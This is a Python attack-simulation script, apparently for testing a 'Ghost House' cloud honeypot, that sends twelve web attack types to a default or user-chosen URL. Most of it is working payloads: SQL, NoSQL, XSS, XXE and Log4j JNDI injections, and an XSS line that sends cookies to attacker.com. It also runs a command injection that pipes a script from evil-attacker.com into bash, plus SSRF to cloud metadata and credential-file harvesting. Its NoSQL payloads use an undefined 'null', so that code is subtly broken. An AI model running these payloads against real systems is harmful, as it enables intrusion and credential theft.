import argparse
import json
import time
import urllib.request
import urllib.error

DEFAULT_TARGET = "https://6jcln499oi.execute-api.ap-south-1.amazonaws.com/default/ghostHouseDecoy"


def send_request(url, method="GET", data=None, user_agent=None, extra_headers=None):
    start = time.time()
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": user_agent or "GhostHouse-AttackSim/3.0"
        }
        if extra_headers:
            headers.update(extra_headers)

        body = None
        if data is not None:
            if isinstance(data, (dict, list)):
                body = json.dumps(data).encode("utf-8")
            elif isinstance(data, str):
                body = data.encode("utf-8")

        request = urllib.request.Request(
            url,
            data=body,
            headers=headers,
            method=method
        )

        with urllib.request.urlopen(request, timeout=10) as response:
            elapsed = (time.time() - start) * 1000
            print(f"  [{response.status}] {method:<5} {url} ({elapsed:.0f} ms)")
            return response.status

    except urllib.error.HTTPError as error:
        elapsed = (time.time() - start) * 1000
        print(f"  [{error.code}] {method:<5} {url} ({elapsed:.0f} ms)")
        return error.code

    except Exception as error:
        print(f"  [ERR]   {method:<5} {url} -> {error}")
        return 0


def normal_probe(target):
    print("\n[+] === 1. NORMAL BENIGN PROBE ===")
    send_request(
        f"{target}/login",
        "POST",
        {
            "username": "testuser",
            "password": "TestPassword@123"
        }
    )
    send_request(f"{target}/dashboard", "GET")
    send_request(f"{target}/api-keys", "GET")


def brute_force(target):
    print("\n[!] === 2. BRUTE FORCE / CREDENTIAL STUFFING SIMULATION ===")
    passwords = [
        "password123",
        "admin123",
        "test123",
        "welcome123",
        "qwerty123",
        "letmein123",
        "ghost123",
        "password1"
    ]

    for pwd in passwords:
        send_request(
            f"{target}/login",
            "POST",
            {
                "username": "admin",
                "password": pwd
            }
        )
        time.sleep(0.25)


def scanner(target):
    print("\n[!] === 3. RECONNAISSANCE SCANNER SIMULATION ===")
    paths = [
        "/",
        "/login",
        "/dashboard",
        "/admin",
        "/users",
        "/api-keys",
        "/robots.txt",
        "/.env",
        "/config",
        "/api"
    ]

    for path in paths:
        send_request(f"{target}{path}", "GET", user_agent="Nikto/2.1.6")
        time.sleep(0.2)


def sqli(target):
    print("\n[!] === 4. SQL INJECTION (SQLi) SIMULATION ===")
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL, username, password FROM users --",
        "1; DROP TABLE users; --",
        "' UNION SELECT schema_name FROM information_schema.schemata --"
    ]

    for payload in payloads:
        send_request(
            f"{target}/login",
            "POST",
            {
                "username": payload,
                "password": "test_password"
            },
            user_agent="sqlmap/1.7.2#stable"
        )
        time.sleep(0.25)


def xss(target):
    print("\n[!] === 5. CROSS-SITE SCRIPTING (XSS) SIMULATION ===")
    payloads = [
        "<script>alert('GHOST_HOUSE_XSS')</script>",
        "<img src=x onerror=alert('PWNED')>",
        "\"><svg/onload=fetch('http://attacker.com/steal?c='+document.cookie)>",
        "<iframe src=\"javascript:alert('XSS')\">",
        "javascript:alert(document.domain)"
    ]

    for payload in payloads:
        send_request(
            f"{target}/login",
            "POST",
            {
                "username": payload,
                "password": "xss_test_password"
            }
        )
        time.sleep(0.25)


def traversal(target):
    print("\n[!] === 6. PATH TRAVERSAL / LFI SIMULATION ===")
    paths = [
        "/..%2f..%2f..%2fetc/passwd",
        "/../../../../etc/shadow",
        "/.git/config",
        "/.aws/credentials",
        "/windows/win.ini",
        "/../../../../var/log/auth.log"
    ]

    for path in paths:
        send_request(f"{target}{path}", "GET")
        time.sleep(0.2)


def rce(target):
    print("\n[!] === 7. REMOTE COMMAND INJECTION (RCE) SIMULATION ===")
    payloads = [
        {"cmd": "; whoami && id"},
        {"cmd": "| uname -a; cat /etc/passwd"},
        {"service": "ping 127.0.0.1; whoami"},
        {"exec": "$(curl http://evil-attacker.com/shell.sh | bash)"},
        {"username": "; cat /etc/shadow", "password": "x"}
    ]

    for payload in payloads:
        send_request(
            f"{target}/admin",
            "POST",
            payload,
            user_agent="GhostHouse-RCE-Sim/1.0"
        )
        time.sleep(0.25)


def ssrf(target):
    print("\n[!] === 8. SERVER-SIDE REQUEST FORGERY (SSRF) / METADATA EXFILTRATION ===")
    targets = [
        f"{target}/api/proxy?url=http://169.254.169.254/latest/meta-data/",
        f"{target}/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        f"{target}/api/fetch?url=http://127.0.0.1:8080/admin",
        f"{target}/api/webhook?url=http://metadata.google.internal/computeMetadata/v1/"
    ]

    for url in targets:
        send_request(url, "GET", user_agent="GhostHouse-SSRF-Sim/1.0")
        time.sleep(0.25)


def log4j(target):
    print("\n[!] === 9. LOG4J / JNDI INJECTION (CVE-2021-44228) SIMULATION ===")
    payloads = [
        "${jndi:ldap://attacker.threat-mesh.org:1389/Exploit}",
        "${jndi:rmi://198.51.100.42:1099/Object}",
        "${jndi:dns://attacker.dnslog.cn/leak}",
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/x}"
    ]

    for payload in payloads:
        send_request(
            f"{target}/login",
            "POST",
            {"username": payload, "password": "test_password"},
            extra_headers={"X-Api-Version": payload, "User-Agent": payload}
        )
        time.sleep(0.25)


def nosql(target):
    print("\n[!] === 10. NOSQL INJECTION SIMULATION ===")
    payloads = [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": null}, "password": {"$ne": null}},
        {"username": "admin", "password": {"$regex": "^admin.*"}},
        {"$where": "this.password.match(/.*/)"}
    ]

    for payload in payloads:
        send_request(
            f"{target}/login",
            "POST",
            payload,
            user_agent="GhostHouse-NoSQL-Sim/1.0"
        )
        time.sleep(0.25)


def secrets_harvest(target):
    print("\n[!] === 11. SENSITIVE SECRET & CONFIG FILE HARVESTING ===")
    secret_paths = [
        "/.env",
        "/.git/config",
        "/.aws/credentials",
        "/config.json",
        "/backup.sql",
        "/id_rsa",
        "/docker-compose.yml"
    ]

    for path in secret_paths:
        send_request(
            f"{target}{path}",
            "GET",
            user_agent="SecretFinder/2.0"
        )
        time.sleep(0.2)


def xxe(target):
    print("\n[!] === 12. XML EXTERNAL ENTITY (XXE) INJECTION SIMULATION ===")
    xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

    send_request(
        f"{target}/api/xml",
        "POST",
        data=xml_payload,
        extra_headers={"Content-Type": "application/xml"},
        user_agent="GhostHouse-XXE-Sim/1.0"
    )


def run_all(target):
    print("\n" + "=" * 65)
    print("      GHOST HOUSE COMPREHENSIVE MULTI-VECTOR ATTACK SUITE")
    print("=" * 65)
    print(f"Target Honeypot: {target}\n")

    normal_probe(target)
    time.sleep(0.5)

    brute_force(target)
    time.sleep(0.5)

    scanner(target)
    time.sleep(0.5)

    sqli(target)
    time.sleep(0.5)

    xss(target)
    time.sleep(0.5)

    traversal(target)
    time.sleep(0.5)

    rce(target)
    time.sleep(0.5)

    ssrf(target)
    time.sleep(0.5)

    log4j(target)
    time.sleep(0.5)

    nosql(target)
    time.sleep(0.5)

    secrets_harvest(target)
    time.sleep(0.5)

    xxe(target)

    print("\n" + "=" * 65)
    print("[✓] ALL 12 MULTI-VECTOR ATTACK SIMULATIONS COMPLETED SUCCESSFULLY")
    print("Check your Ghost House Security Operations Center (SOC) to view live telemetry!")
    print("=" * 65 + "\n")


def interactive_menu():
    print("\n==================================================")
    print("    GHOST HOUSE THREAT DECEPTION ATTACK SUITE")
    print("==================================================")
    target_input = input(f"Enter target URL (Press Enter for default: {DEFAULT_TARGET}): ").strip()
    target = target_input.rstrip("/") if target_input else DEFAULT_TARGET

    print("\nSelect Simulation Attack Mode:")
    print("  1.  Normal Probe (Benign)")
    print("  2.  Brute Force / Credential Stuffing")
    print("  3.  Reconnaissance Scanner (Nikto / Directory Probe)")
    print("  4.  SQL Injection (SQLi)")
    print("  5.  Cross-Site Scripting (XSS)")
    print("  6.  Path Traversal / LFI")
    print("  7.  Remote Command Injection (RCE)")
    print("  8.  SSRF & Cloud Metadata Exfiltration")
    print("  9.  Log4j / JNDI Exploit (CVE-2021-44228)")
    print("  10. NoSQL Injection")
    print("  11. Sensitive Secret Harvesting (.env, .git, .aws)")
    print("  12. XML External Entity (XXE)")
    print("  13. Run All (Comprehensive Threat Suite Presentation Demo)")
    print("  0.  Exit")

    choice = input("\nChoice [1-13]: ").strip()

    mode_map = {
        "1": "normal",
        "2": "brute",
        "3": "scanner",
        "4": "sqli",
        "5": "xss",
        "6": "traversal",
        "7": "rce",
        "8": "ssrf",
        "9": "log4j",
        "10": "nosql",
        "11": "secrets",
        "12": "xxe",
        "13": "all"
    }

    if choice in mode_map:
        return target, mode_map[choice]
    else:
        print("Exiting.")
        exit(0)


def main():
    parser = argparse.ArgumentParser(
        description="Ghost House Cloud Honeypot Attack Simulation Tool v3.0"
    )

    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Base URL of your Ghost House deployment (default: {DEFAULT_TARGET})"
    )

    parser.add_argument(
        "--mode",
        choices=[
            "normal",
            "brute",
            "scanner",
            "sqli",
            "xss",
            "traversal",
            "rce",
            "ssrf",
            "log4j",
            "nosql",
            "secrets",
            "xxe",
            "all"
        ],
        help="Simulation mode. If omitted, opens interactive menu."
    )

    args = parser.parse_args()

    if not args.mode:
        target, mode = interactive_menu()
    else:
        target = args.target.rstrip("/")
        mode = args.mode

    dispatch = {
        "normal": normal_probe,
        "brute": brute_force,
        "scanner": scanner,
        "sqli": sqli,
        "xss": xss,
        "traversal": traversal,
        "rce": rce,
        "ssrf": ssrf,
        "log4j": log4j,
        "nosql": nosql,
        "secrets": secrets_harvest,
        "xxe": xxe,
        "all": run_all
    }

    if mode in dispatch:
        dispatch[mode](target)


if __name__ == "__main__":
    main()